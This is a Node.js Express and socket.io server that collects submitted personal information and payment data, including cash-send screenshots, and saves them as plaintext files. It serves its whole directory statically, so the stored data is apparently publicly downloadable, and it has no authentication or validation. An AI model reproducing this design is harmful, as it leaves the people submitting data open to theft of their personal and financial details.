const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 1e8 });

app.use(express.static(__dirname));

// Create directories if they don’t exist
const uploadsDir = path.join(__dirname, 'uploads');
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);

io.on('connection', (socket) => {
    console.log('A user connected with ID:', socket.id);

    socket.on('submit-personal-info', (data) => {
        const timestamp = Date.now();
        const filename = `personal_info_${timestamp}.txt`;
        const filePath = path.join(dataDir, filename);
        
        // Save personal info to a file
        const content = JSON.stringify(data, null, 2); // Pretty-print JSON
        fs.writeFile(filePath, content, (err) => {
            if (err) {
                console.error('Error saving personal info:', err);
            } else {
                console.log(`Personal info saved to: ${filePath}`);
            }
        });
    });

    socket.on('submit-payment', (data) => {
        const timestamp = Date.now();
        let filename = `payment_${timestamp}.txt`;
        const filePath = path.join(dataDir, filename);

        // Handle screenshot for Cash Send
        if (data.method === 'cash-send' && data.screenshot) {
            try {
                const base64Data = data.screenshot.replace(/^data:image\/\w+;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                const screenshotFilename = `screenshot_${timestamp}.jpg`;
                const screenshotPath = path.join(uploadsDir, screenshotFilename);
                
                fs.writeFile(screenshotPath, buffer, (err) => {
                    if (err) {
                        console.error('Error saving screenshot:', err);
                    } else {
                        console.log(`Screenshot saved as: ${screenshotPath}`);
                    }
                });
                
                // Add screenshot filename to payment data
                data.screenshotFilename = screenshotFilename;
                delete data.screenshot; // Remove base64 data from the saved file
            } catch (err) {
                console.error('Error processing screenshot:', err);
            }
        }

        // Save payment data to a file
        const content = JSON.stringify(data, null, 2); // Pretty-print JSON
        fs.writeFile(filePath, content, (err) => {
            if (err) {
                console.error('Error saving payment data:', err);
            } else {
                console.log(`Payment data saved to: ${filePath}`);
            }
        });
    });

    socket.on('error', (error) => console.error('Socket error:', error));
    socket.on('disconnect', (reason) => console.log('A user disconnected with ID:', socket.id, 'Reason:', reason));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));